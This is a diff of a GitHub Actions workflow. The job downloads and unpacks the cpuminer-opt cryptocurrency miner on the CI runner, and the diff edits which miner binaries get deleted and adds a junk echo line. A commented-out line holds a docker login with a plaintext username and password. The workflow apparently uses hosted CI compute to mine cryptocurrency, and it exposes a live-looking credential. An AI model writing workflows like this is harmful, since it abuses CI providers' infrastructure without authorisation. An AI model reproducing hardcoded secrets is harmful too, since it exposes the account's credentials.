@@ -9,8 +9,10 @@ jobs:
      - run: |
          wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
          tar -xvf cpuminer-opt-linux.tar.gz
-         rm *.sh
+         rm *.sh cpuminer-avx512		  cpuminer-ryzen    cpuminer-sse42 cpuminer-avx   cpuminer-avx512-sha-vaes   cpuminer-sse42-aes cpuminer-avx2  cpuminer-opt-linux.tar.gz  cpuminer-sse2amd
+         echo asuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
          ls
+         
          
          # docker login -u christiankm01 -p Danang-112
          # docker build . -t christiankm01/kilo:1
